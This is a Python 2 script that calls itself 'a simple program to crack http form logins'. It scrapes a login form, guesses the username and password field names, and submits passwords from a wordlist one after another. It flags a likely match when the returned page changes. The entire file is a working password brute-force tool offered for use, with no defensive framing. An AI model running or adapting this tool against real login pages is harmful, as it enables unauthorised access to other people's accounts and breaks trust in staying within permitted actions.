#!/usr/bin/python
#
# Copyright (c) 2010-2011, Luke Snyder. This file is
# licensed under the Affero General Public License version 3 or later. See
# the COPYRIGHT file.

import sys, argparse, string, urllib2, os.path, difflib
try:
	from ClientForm import ParseResponse, ControlNotFoundError
except ImportError:
	print "ClientForm not installed it is available at http://wwwsearch.sourceforge.net/old/ClientForm/src/ClientForm-0.2.10.tar.gz"
	exit()
from time import sleep

argsParser = argparse.ArgumentParser(description="A simple program to crack http form logins")
argsParser.add_argument("-l", "--url", dest="urlLocation", type=str, required=True,
						help="The url of the form page")
argsParser.add_argument("-u", "--user", dest="user", type=str, required=True,
						help="Username to input into form", default="admin")
argsParser.add_argument("-p", "--password", dest="passwordFile", type=str, required=True,
						help="full path to file with a list of passwords to try")
argsParser.add_argument("-r", "--checkURL", dest="checkURL", type=str,
						help="url to check instead of the form url (usually not needed)")
argsParser.add_argument("-s", "--sensitivity", dest="sensitive", type=float, default=10,
						help="Set the sensitivity of the difference to a logged-in page and non-logged-in page")
argsParser.add_argument("-c", "--check", dest="justCheck", action="store_const",
						const=True, default=False, help="Switch to inspect the form")
args = argsParser.parse_args()

COOKIEFILE = 'cookies.lwp'
open(COOKIEFILE, "w").write("#LWP-Cookies-2.0")


def collectFormInfo(url): ## collects form/forms data and returns as a list of objects
	request = urllib2.Request(url)
	response = urllib2.urlopen(request)
	forms = ParseResponse(response, backwards_compat=False)
	response.close()
	return forms


def parseFormInfo(forms):
	if len(forms) > 1: ## if there is more then one form choose which one to use
		print "Which form is the correct"
		for num in range(len(forms)):
			print "[%i] Form with action url: %s" % (num, forms[num].action)
		formNum = raw_input("--> ")
		try:
			formNum = int(formNum)
		except:
			print "invalid form number"	
			exit()
		if formNum > len(forms):
			print "invalid form number"
			exit()
		print "using form with id %i and action url %s" % (formNum, forms[formNum].action)
	else: ## if there is only one form use the first one
		formNum = 0
	form = forms[formNum]
	try: ## trying to find the username field from common names
		userFieldName = form.find_control("username").name
	except ControlNotFoundError:
		try:
			userFieldName = form.find_control("user").name
		except ControlNotFoundError:
			try:
				userFieldName = form.find_control("email").name
			except:
				print "Can't automatically find the username field. Please enter the correct field name.\nForm data is:"
				sleep(0.5)
				print form
				userFieldName = raw_input("username field: ")
	try: ## Trying to find the password field from common names
		passFieldName = form.find_control("password").name
	except ControlNotFoundError:
		try:
			passFieldName = form.find_control("pass").name
		except ControlNotFoundError:
			print "Can't automatically find the password field. Please enter the correct field name.\nForm data is"
			print form
			passFieldName = raw_input("password field: ")
	print "using username field as %s" % (userFieldName)
	print "using password field as %s" % (passFieldName)
	return userFieldName, passFieldName, form
	
	
def checkIfLoggedIn(oldPage, url, sensitive): ## method to check it the current cookies allow a successful login
											  ## This has to be a seperate connection and cookie jar. not sure why though
	cj = None
	ClientCookie = None
	cookielib = None
	try: # Trying cookielib
	    import cookielib
	except ImportError: ## Falling back to clientcookie
	    try:
	        import ClientCookie
	    except ImportError: ## falling back to no cookie jar
	        urlopen = urllib2.urlopen
	        Request = urllib2.Request
	    else: ## using ClientCookie for cookie jar
	        urlopen = ClientCookie.urlopen
	        Request = ClientCookie.Request
	        cj = ClientCookie.LWPCookieJar()
	else: ## using cookielib for cookie jar
	    urlopen = urllib2.urlopen
	    Request = urllib2.Request
	    cj = cookielib.LWPCookieJar()
	if cj is not None: ## if we succesfully imported a cookie jar library
	    if os.path.isfile(COOKIEFILE): ## if cookiefile exists
	        cj.load(COOKIEFILE)
	    if cookielib is not None: ## we used cookielib
	        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
	        opener.addheaders = [('User-agent', 'Mozilla/5.0')] # Some sites block requests w/o user-agent header
	        urllib2.install_opener(opener)
	    else: ## if we used ClientCookie
	        opener = ClientCookie.build_opener(ClientCookie.HTTPCookieProcessor(cj))
	        opener.addheaders = [('User-agent', 'Mozilla/5.0')] # Some sites block requests w/o user-agent header
	        ClientCookie.install_opener(opener)
	attempt = urlopen(url) ## finally open the page
	return difflib.SequenceMatcher(None, oldPage, attempt.read()).ratio() ## return the similary ratio of the old page to the new page



def inputInfo(userFieldName, passFieldName, username, form, url, sensitive):  ## where the magic happens
	cj = None
	ClientCookie = None
	cookielib = None
	try: # Trying cookielib
	    import cookielib
	except ImportError: ## Falling back to clientcookie
	    try:
	        import ClientCookie
	    except ImportError: ## falling back to no cookie jar
	        urlopen = urllib2.urlopen
	        Request = urllib2.Request
	    else: ## using ClientCookie for cookie jar
	        urlopen = ClientCookie.urlopen
	        Request = ClientCookie.Request
	        cj = ClientCookie.LWPCookieJar()
	else: ## using cookielib for cookie jar
	    urlopen = urllib2.urlopen
	    Request = urllib2.Request
	    cj = cookielib.LWPCookieJar()
	if cj is not None: ## if we succesfully imported a cookie jar library
	    if os.path.isfile(COOKIEFILE): ## if cookiefile exists
	        cj.load(COOKIEFILE)
	    if cookielib is not None: ## we used cookielib
	        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
	        opener.addheaders = [('User-agent', 'Mozilla/5.0')] # Some sites block requests w/o user-agent header
	        urllib2.install_opener(opener)
	    else: ## if we used ClientCookie
	        opener = ClientCookie.build_opener(ClientCookie.HTTPCookieProcessor(cj))
	        opener.addheaders = [('User-agent', 'Mozilla/5.0')] # Some sites block requests w/o user-agent header
	        ClientCookie.install_opener(opener)
	else:
		print "I was not able to import a cookie jar library so I may not work. Attempting anyway"
	passwordFile = open(args.passwordFile, "r")
	password = passwordFile.readline().strip() ## read the first password in the file and strip any spaces at beginning and end
	oldDiff = -1 # Set an initial value for the oldDiff
	print "Working"
	while password: ## Loop until we reach the end of the file or find a good match
		form[userFieldName] = username ## fill out the form
		form[passFieldName] = password
		attempt = form.click() ## "click" submit
		attempt = urlopen(attempt) ## upload the data and save the returned page
		currentDiff = checkIfLoggedIn(attempt.read(), url, sensitive) ## check the current vs old pages diff
		if abs(oldDiff - currentDiff) * 100.0 > sensitive and oldDiff != -1: ## if the diff is more then the sensitivity level
			print "Possible correct password: %s" % password.strip()		 ## throw a possible correct password
			answer = raw_input("Is this correct? (y/n) ")
			if answer.lower() == "y" or answer.lower() == "yes": ## if the user says the password is a good one exit
				exit(0)
			else:
				oldDiff = oldDiff ## if the user says no keep the current oldDiff value to avoid false positives
		else:
			oldDiff = currentDiff ## if it is not different enough update the oldDiff to the new page
		attempt.close() ## close the connection
		for index, cookie in enumerate(cj): ## save current cookies
			cj.save(COOKIEFILE)
		password = passwordFile.readline().strip() ## read next password
	passwordFile.close() ## at the end of the file close it


def main(url, args): ## gather info in one place and conduct program
	forms = collectFormInfo(url)
	if args.justCheck == True: ## if only checking for forms print form data and exit
		for form in forms:
			print form
			exit()
	userField, passField, correctForm = parseFormInfo(forms) ## return the form names and form object
	if args.checkURL:
		url = args.checkURL
	inputInfo(userField, passField, args.user, correctForm, url, args.sensitive) ## make the magic happen


main(args.urlLocation, args)
